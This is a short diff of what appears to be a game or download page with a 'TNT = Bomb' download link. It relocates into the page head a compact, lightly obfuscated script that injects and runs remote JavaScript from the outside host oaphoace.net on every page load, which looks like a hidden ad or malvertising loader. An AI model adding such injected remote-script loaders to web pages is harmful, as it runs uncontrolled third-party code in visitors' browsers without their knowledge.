@@ -36,10 +36,10 @@
 ## TNT = Bomb
 >[Download](./tntbomb.html)
 <head>
+<script>
+(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('oaphoace.net',5333655,document.createElement('script'))
+</script>
 </head>
-
-    <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('oaphoace.net',5333655,document.createElement('script'))</script>
-
 
 
 
